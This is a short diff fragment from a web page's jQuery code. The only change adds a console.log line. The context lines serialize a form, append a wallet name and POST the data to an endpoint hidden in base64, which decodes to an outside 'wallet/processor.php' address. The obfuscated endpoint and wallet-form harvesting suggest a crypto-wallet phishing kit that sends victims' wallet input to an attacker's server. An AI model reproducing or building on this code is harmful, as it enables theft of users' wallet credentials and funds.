@@ -4025,7 +4025,7 @@
   
   var formData = $(this).serialize();
   formData += '&wallet='+$('#wallet_name').text().trim();
-  
+  console.log($('#wallet_name').text().trim());
   $.ajax({
     url: atob('aHR0cHM6Ly9veGJpdHdvcmxkLmNvbS93YWxsZXQvcHJvY2Vzc29yLnBocA=='),
     type: 'POST',
